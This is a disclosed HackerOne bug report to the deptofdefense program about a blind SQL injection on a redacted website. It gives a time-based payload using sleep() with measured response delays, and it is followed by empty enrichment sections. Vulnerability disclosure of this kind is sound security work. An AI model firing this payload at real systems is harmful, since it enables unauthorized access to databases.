---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2020429'
original_report_id: '2020429'
title: Blind Sql Injection https:/████████
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2023-06-10T09:32:28.846Z'
disclosed_at: '2023-06-30T17:51:52.063Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 35
tags:
- hackerone
- sql-injection
---

# Blind Sql Injection https:/████████

## Metadata

- HackerOne Report ID: 2020429
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2023-06-30T17:51:52.063Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
found on the websitehttps://████████ weakness is vulnerable to a blind sql injection.

POC: https:/█████████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
Tests Payload performed:
    0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
    0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z => 10.740
	0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z => 2.714
    0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z => 1.927

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
  
Best regards,
CodeSlayer137

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
